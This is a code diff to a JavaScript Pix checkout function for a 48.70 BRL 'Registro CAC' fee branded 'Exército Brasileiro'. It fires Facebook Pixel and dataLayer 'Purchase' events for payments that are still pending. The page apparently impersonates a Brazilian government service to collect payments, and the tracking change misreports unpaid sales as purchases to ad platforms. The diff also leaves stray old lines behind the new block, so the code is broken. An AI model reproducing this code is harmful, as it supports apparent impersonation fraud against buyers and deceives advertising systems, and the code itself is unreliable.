@@ -704,20 +704,53 @@ async function gerarPix() {
             });
         }
         
-        // UTMIFY: Envia evento de Venda Pendente
-        console.log('[Utmify] Enviando evento de Venda Pendente...');
+        // UTMIFY: Envia evento Purchase (Venda Pendente)
+        console.log('[Utmify] Enviando evento Purchase para Venda Pendente...');
         
         setTimeout(() => {
             try {
                 const userData = AVEN_API.getUserData();
                 
-                // 1. Facebook Pixel InitiateCheckout
+                // 1. Facebook Pixel: Purchase (Utmify vai detectar como pendente)
                 if (typeof fbq !== 'undefined') {
-                    fbq('track', 'InitiateCheckout', {
+                    fbq('track', 'Purchase', {
                         value: 48.70,
                         currency: 'BRL',
                         content_name: 'Registro CAC',
-                        content_type: 'product'
+                        content_type: 'product',
+                        num_items: 1
+                    });
+                    console.log('[Utmify] Facebook Pixel Purchase enviado (pendente)');
+                }
+                
+                // 2. DataLayer - Purchase
+                window.dataLayer = window.dataLayer || [];
+                window.dataLayer.push({
+                    'event': 'purchase',
+                    'ecommerce': {
+                        'purchase': {
+                            'actionField': {
+                                'id': paymentData.id,
+                                'affiliation': 'CAC Online',
+                                'revenue': '48.70',
+                                'tax': '0',
+                                'shipping': '0'
+                            },
+                            'products': [{
+                                'name': 'Taxa de Registro CAC',
+                                'id': paymentData.id,
+                                'price': '48.70',
+                                'brand': 'Exército Brasileiro',
+                                'category': 'Registro/CAC',
+                                'quantity': 1
+                            }]
+                        }
+                    },
+                    'value': 48.70,
+                    'currency': 'BRL',
+                    'transaction_id': paymentData.id
+                });
+                console.log('[Utmify] DataLayer Purchase pushed');
                     });
                     console.log('[Utmify] Facebook Pixel InitiateCheckout enviado');
                 }
